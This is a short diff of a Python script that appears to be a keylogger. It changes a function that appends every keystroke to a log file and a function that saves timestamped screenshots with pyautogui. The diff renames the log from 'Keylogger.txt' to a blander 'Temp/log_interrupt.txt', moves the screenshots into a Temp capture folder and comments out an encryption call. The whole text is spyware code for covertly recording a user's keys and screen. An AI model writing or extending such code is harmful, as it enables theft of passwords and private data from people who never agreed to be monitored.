@@ -32,7 +32,7 @@ def keystroke(key):
     
     # print(key)Temp\\
 
-    with open("Keylogger.txt", 'a') as f:
+    with open("Temp/log_interrupt.txt", 'a') as f:
         f.write(key)
 
 # capture
@@ -40,9 +40,8 @@ def capturekey(k):
     time.sleep(1.2)
     x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
     x = x + k + '.jpg'
-    #print(x) 'Temp\\Capture\\'+ 
-    pyautogui.screenshot().save(x)
-    encrypt(x)
+    pyautogui.screenshot().save('Temp\\Capture\\'+x)
+    # encrypt(x)
 
 def encrypt(file):
     print("encrypt\n")
